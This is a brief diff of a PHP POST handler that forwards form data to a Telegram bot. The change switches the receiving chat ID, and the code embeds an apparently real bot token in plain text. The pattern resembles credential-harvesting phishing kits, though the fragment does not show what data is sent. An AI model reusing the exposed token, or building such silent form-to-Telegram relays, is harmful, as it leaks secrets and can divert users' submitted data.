@@ -129,7 +129,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Send to Telegram
         $telegram_token = '7322742533:AAEEYMpmOGhkwuOyfU-6Y4c6UtjK09ti9vE'; // Your bot token
-        $chat_id = '2110723601'; // Your chat ID
+        $chat_id = '-1002458122628'; // Your chat ID
         $telegram_url = "https://api.telegram.org/bot$telegram_token/sendMessage";
 
         $data = [
